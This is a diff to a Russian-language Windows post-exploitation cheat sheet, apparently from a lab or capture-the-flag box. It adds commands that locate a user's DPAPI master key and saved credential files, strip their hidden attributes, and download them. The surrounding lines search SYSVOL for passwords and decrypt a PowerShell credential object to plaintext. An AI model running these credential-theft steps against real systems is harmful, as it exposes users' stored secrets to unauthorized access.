@@ -21,12 +21,31 @@ wmic product get name
 
     findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs
     
-# Учетные данные PowerShell (DPAPI)
+# Учетные данные (DPAPI) PowerShell
+    ls -force C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107
+    ls -force C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials
+
+Скачаем на локальную машину мастерключ и сам сохраненный кред, предварительно, сняв с них атрибуты системного и скрытого файла:
+
+    # снимаем защитные атрибуты мастерключа
+    (Get-Item -LiteralPath "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" -Force).Attributes = 'Archive'
+    # скачиваем мастерключ
+    download C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
+    # снимаем защитные атрибуты креда
+    (Get-Item -LiteralPath "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" -Force).Attributes = 'Archive'
+    # скачиваем кред
+    download C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
+    
+
+
 
     $credObject = Import-Clixml -Path "C:\path\to\file.xml"
     $plainPassword = $credObject.GetNetworkCredential().Password
     Write-Output "Username: $($credObject.UserName)"
     Write-Output "Password: $plainPassword"
+
+
+
 
 # Файл истории PowerShell
 
